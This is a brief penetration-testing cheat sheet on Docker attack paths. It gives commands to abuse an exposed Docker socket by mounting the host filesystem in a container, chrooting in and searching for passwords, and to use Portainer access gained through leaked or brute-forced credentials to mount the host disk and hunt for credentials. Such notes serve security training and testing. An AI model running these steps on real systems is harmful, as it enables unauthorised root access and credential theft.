# Docker-Related Attack Vectors

### Docker Socket

* If you have user privileges in a host machine check these:&#x20;
  * Find `netstat -tunape` docker socket in localhost
  * export it to env `export DOCKER_HOST="tcp://localhost:2222"`
  * Look docker images in host machine and run it with connecting host
    * &#x20;`docker run -it -v /:/host ubuntu:20.04 bash`
    * `cd /host/`
    * `chroot ./ bash`
    * `find / -name password`



### Portainer Web UI access

* If you have portainer access, (via leaked creds or bruteforce)
  * Create privileged docker via portainer web UI&#x20;
  * Later connect there via from web ui of portainer:
    * `mount /dev/sda /mnt`
    * `cd /mnt`
    * `chroot ./ bash`
    * Then find credentials in root mounted&#x20;
